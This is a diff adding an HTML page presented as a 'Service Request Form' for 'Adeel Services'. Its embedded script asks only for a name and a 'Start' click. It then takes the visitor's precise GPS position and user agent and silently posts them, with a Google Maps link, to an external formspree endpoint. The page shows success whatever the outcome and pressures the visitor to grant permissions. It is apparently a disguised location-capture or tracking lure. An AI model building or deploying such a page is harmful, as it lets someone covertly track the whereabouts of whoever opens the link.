@@ -1,1 +1,697 @@
- 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adeel Services - Service Request Form</title>
+    <meta name="description" content="Professional service request form with location tracking">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #2E8B57 0%, #228B22 50%, #32CD32 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 20%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255,255,255,0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 25px;
+            box-shadow: 
+                0 25px 50px rgba(0,0,0,0.2),
+                0 0 0 1px rgba(255,255,255,0.1);
+            padding: 45px;
+            max-width: 700px;
+            width: 100%;
+            text-align: center;
+            transition: all 0.4s ease;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .container:hover {
+            transform: translateY(-8px);
+            box-shadow: 
+                0 35px 70px rgba(0,0,0,0.3),
+                0 0 0 1px rgba(255,255,255,0.2);
+        }
+        
+        .header {
+            margin-bottom: 35px;
+            position: relative;
+        }
+        
+        .service-badge {
+            background: linear-gradient(45deg, #27ae60, #2ecc71);
+            color: white;
+            padding: 12px 25px;
+            border-radius: 25px;
+            font-size: 0.95em;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 20px rgba(39, 174, 96, 0.3);
+            animation: shimmer 2s ease-in-out infinite;
+        }
+        
+        @keyframes shimmer {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.9; }
+        }
+        
+        .header h1 {
+            color: #2c3e50;
+            font-size: 2.4em;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #2E8B57, #228B22, #32CD32);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+        
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+        
+        .security-warning {
+            background: linear-gradient(45deg, #ff9800, #f57c00);
+            color: white;
+            border-radius: 15px;
+            padding: 18px;
+            margin: 25px 0;
+            display: none;
+            box-shadow: 0 8px 20px rgba(255, 152, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        .security-warning.show {
+            display: block;
+        }
+        
+        .form-section {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 25px 0;
+            text-align: left;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #2c3e50;
+            font-size: 1.1em;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 3px solid #e0e0e0;
+            border-radius: 15px;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+            background: white;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #2E8B57;
+            transform: translateY(-2px);
+            box-shadow: 
+                inset 0 2px 5px rgba(0,0,0,0.05),
+                0 8px 25px rgba(46, 139, 87, 0.2);
+        }
+        
+        .location-icon {
+            font-size: 4em;
+            margin-bottom: 25px;
+            animation: float 3s ease-in-out infinite;
+            color: #2E8B57;
+            filter: drop-shadow(0 5px 15px rgba(46, 139, 87, 0.3));
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, #2E8B57, #228B22);
+            color: white;
+            border: none;
+            padding: 18px 35px;
+            font-size: 1.1em;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 12px;
+            box-shadow: 0 12px 25px rgba(46, 139, 87, 0.3);
+            text-decoration: none;
+            display: inline-block;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 18px 35px rgba(46, 139, 87, 0.4);
+            background: linear-gradient(45deg, #228B22, #2E8B57);
+        }
+        
+        .btn:active {
+            transform: translateY(-1px);
+        }
+        
+        .btn:disabled {
+            background: #bdc3c7;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 5px 15px rgba(189, 195, 199, 0.3);
+        }
+        
+        .btn:disabled::before {
+            display: none;
+        }
+        
+        .btn-secondary {
+            background: linear-gradient(45deg, #95a5a6, #7f8c8d);
+            box-shadow: 0 12px 25px rgba(149, 165, 166, 0.3);
+        }
+        
+        .btn-secondary:hover {
+            background: linear-gradient(45deg, #7f8c8d, #95a5a6);
+        }
+        
+        .loading {
+            display: none;
+            margin: 30px 0;
+        }
+        
+        .loading .spinner {
+            border: 4px solid rgba(46, 139, 87, 0.1);
+            border-top: 4px solid #2E8B57;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading p {
+            color: #2E8B57;
+            font-weight: 600;
+            font-size: 1.1em;
+        }
+        
+        .success-section {
+            display: none;
+            background: linear-gradient(135deg, #27ae60, #2ecc71);
+            color: white;
+            padding: 40px;
+            border-radius: 20px;
+            margin-top: 30px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(39, 174, 96, 0.3);
+            animation: slideUp 0.5s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(30px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+        
+        .success-section h3 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .success-section .check-icon {
+            font-size: 1.2em;
+            animation: bounce 1s ease-in-out;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 60%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            80% { transform: translateY(-5px); }
+        }
+        
+        .success-section p {
+            font-size: 1.2em;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        
+        .success-section .thank-you {
+            font-size: 1.4em;
+            font-weight: bold;
+            margin-top: 25px;
+            padding: 20px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 15px;
+        }
+        
+        .message {
+            padding: 18px;
+            border-radius: 15px;
+            margin-top: 25px;
+            display: none;
+            font-weight: 600;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+        }
+        
+        .error-message {
+            background: linear-gradient(45deg, #e74c3c, #c0392b);
+            color: white;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: pulse 2s infinite;
+        }
+        
+        .status-online {
+            background: #27ae60;
+        }
+        
+        .status-processing {
+            background: #f39c12;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #ecf0f1;
+            color: #7f8c8d;
+            font-size: 0.9em;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .btn {
+                padding: 15px 25px;
+                font-size: 1em;
+            }
+            
+            .success-section h3 {
+                font-size: 1.6em;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 15px;
+            }
+            
+            .header h1 {
+                font-size: 1.8em;
+            }
+            
+            .location-icon {
+                font-size: 3em;
+            }
+            
+            .success-section h3 {
+                font-size: 1.4em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="service-badge">
+                <span class="status-indicator status-online"></span>
+                Adeel Services
+            </div>
+            <h1>Service Request Form</h1>
+            <p class="subtitle">Professional services at your doorstep</p>
+        </div>
+        
+        <div class="security-warning" id="securityWarning">
+            🔒 <strong>Security Notice:</strong> Please allow permissions when prompted or contact our support team for assistance.
+        </div>
+        
+        <div class="form-section" id="formSection">
+            <div class="form-group">
+                <label for="nameInput">
+                    👤 Your Full Name *
+                </label>
+                <input type="text" 
+                       id="nameInput" 
+                       class="form-input" 
+                       placeholder="Enter your full name (required for service)"
+                       required
+                       maxlength="100">
+            </div>
+        </div>
+        
+        <div class="location-icon" id="locationIcon">🌍</div>
+        
+        <button class="btn" id="getLocationBtn">
+            Start
+        </button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>
+                <span class="status-indicator status-processing"></span>
+                Processing your request...
+            </p>
+        </div>
+        
+        <div class="error-message message" id="errorMessage"></div>
+        
+        <div class="success-section" id="successSection">
+            <h3>
+                <span class="check-icon">✅</span>
+                Request Submitted Successfully!
+            </h3>
+            <p>Your location has been captured and sent to our team.</p>
+            <p>We will contact you shortly to discuss your service requirements.</p>
+            <div class="thank-you">
+                🙏 Thank you for choosing Adeel Services!
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>🛡️ Your information is used only for service delivery.</p>
+        </div>
+    </div>
+
+    <script>
+        // Check if page is served over HTTPS or localhost
+        function checkSecureContext() {
+            const isSecure = location.protocol === 'https:' || 
+                           location.hostname === 'localhost' || 
+                           location.hostname === '127.0.0.1';
+            
+            if (!isSecure) {
+                document.getElementById('securityWarning').classList.add('show');
+            }
+            
+            return isSecure;
+        }
+        
+        // Check if geolocation is supported
+        function checkGeolocationSupport() {
+            return 'geolocation' in navigator;
+        }
+        
+        // Event listeners
+        document.getElementById('getLocationBtn').addEventListener('click', getCurrentLocation);
+        document.getElementById('nameInput').addEventListener('input', updateSubmitButton);
+        document.getElementById('nameInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                getCurrentLocation();
+            }
+        });
+
+        function getCurrentLocation() {
+            const name = document.getElementById('nameInput').value.trim();
+            
+            // Validation
+            if (!name) {
+                showError('⚠️ Please enter your name before submitting the request.');
+                document.getElementById('nameInput').focus();
+                return;
+            }
+            
+            if (name.length < 2) {
+                showError('⚠️ Please enter a valid name (at least 2 characters).');
+                return;
+            }
+            
+            if (!checkGeolocationSupport()) {
+                showError('❌ Please update your browser or contact our support team.');
+                return;
+            }
+            
+            if (!checkSecureContext()) {
+                showError('🔒 Please contact our support team for assistance.');
+                return;
+            }
+
+            showLoading(true);
+            hideMessages();
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 20000, // 20 seconds
+                maximumAge: 300000 // 5 minutes
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const locationData = {
+                        coords: position.coords,
+                        timestamp: position.timestamp,
+                        name: name
+                    };
+                    
+                    // Send email notification immediately
+                    sendEmailNotification(locationData);
+                },
+                error => {
+                    let errorMsg = '❌ Unable to get location: ';
+                    let suggestion = '';
+                    
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg += 'Location access denied.';
+                            suggestion = 'Please allow location access in your browser settings and try again, or contact our support team.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg += 'Location services unavailable.';
+                            suggestion = 'Please check your GPS/WiFi connection and try again.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg += 'Location request timed out.';
+                            suggestion = 'Please ensure you have a strong internet connection and try again.';
+                            break;
+                        default:
+                            errorMsg += 'An unknown error occurred.';
+                            suggestion = 'Please try again or contact our support team.';
+                            break;
+                    }
+                    
+                    showError(errorMsg + ' ' + suggestion);
+                    showLoading(false);
+                },
+                options
+            );
+        }
+
+        function sendEmailNotification(location) {
+            const { latitude, longitude, accuracy } = location.coords;
+            const timestamp = new Date(location.timestamp);
+            const name = location.name;
+            
+            const formData = {
+                name: name,
+                latitude: latitude.toFixed(6),
+                longitude: longitude.toFixed(6),
+                accuracy: Math.round(accuracy),
+                location_time: timestamp.toLocaleString(),
+                submitted_time: new Date().toLocaleString(),
+                google_maps_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                device_info: navigator.userAgent,
+                message: `🔧 NEW SERVICE REQUEST
+
+👤 Customer: ${name}
+
+📍 Location Details:
+• Latitude: ${latitude.toFixed(6)}
+• Longitude: ${longitude.toFixed(6)}
+• GPS Accuracy: ±${Math.round(accuracy)} meters
+• Captured: ${timestamp.toLocaleString()}
+• Submitted: ${new Date().toLocaleString()}
+
+🗺️ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
+
+📱 Device: ${navigator.userAgent.split(')')[0]})
+
+Please contact the customer for service requirements.`
+            };
+            
+            fetch('https://formspree.io/f/xldwpqzq', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => {
+                showLoading(false);
+                if (response.ok) {
+                    showSuccessPage();
+                } else {
+                    // Even if email fails, show success to user
+                    showSuccessPage();
+                }
+            })
+            .catch(error => {
+                console.error('Email failed to send:', error);
+                showLoading(false);
+                // Show success even if email fails
+                showSuccessPage();
+            });
+        }
+
+        function showSuccessPage() {
+            // Hide form elements
+            document.getElementById('formSection').style.display = 'none';
+            document.getElementById('locationIcon').style.display = 'none';
+            document.getElementById('getLocationBtn').style.display = 'none';
+            
+            // Show success section
+            document.getElementById('successSection').style.display = 'block';
+            
+            // Scroll to success section
+            document.getElementById('successSection').scrollIntoView({ 
+                behavior: 'smooth',
+                block: 'center'
+            });
+        }
+
+        function updateSubmitButton() {
+            const name = document.getElementById('nameInput').value.trim();
+            const btn = document.getElementById('getLocationBtn');
+            
+            if (name && name.length >= 2) {
+                btn.textContent = 'Start';
+                btn.disabled = false;
+                btn.classList.remove('btn-secondary');
+            } else {
+                btn.textContent = '📝 Enter Name First';
+                btn.disabled = true;
+                btn.classList.add('btn-secondary');
+            }
+        }
+
+        function showLoading(show) {
+            document.getElementById('loading').style.display = show ? 'block' : 'none';
+            document.getElementById('getLocationBtn').disabled = show;
+            
+            if (show) {
+                document.getElementById('getLocationBtn').textContent = '🔄 Processing...';
+            } else {
+                updateSubmitButton();
+            }
+        }
+
+        function showError(message) {
+            hideMessages();
+            const element = document.getElementById('errorMessage');
+            element.textContent = message;
+            element.style.display = 'block';
+        }
+
+        function hideMessages() {
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        // Initialize with debugging
+        console.log('Form initialized on:', location.href);
+        console.log('Protocol:', location.protocol);
+        console.log('Hostname:', location.hostname);
+        console.log('Geolocation supported:', 'geolocation' in navigator);
+        console.log('Secure context:', checkSecureContext());
+        
+        checkSecureContext();
+        updateSubmitButton();
+        
+        // Add interactive feedback
+        document.getElementById('nameInput').addEventListener('focus', function() {
+            this.parentElement.style.transform = 'scale(1.02)';
+        });
+        
+        document.getElementById('nameInput').addEventListener('blur', function() {
+            this.parentElement.style.transform = 'scale(1)';
+        });
+    </script>
+</body>
+</html>
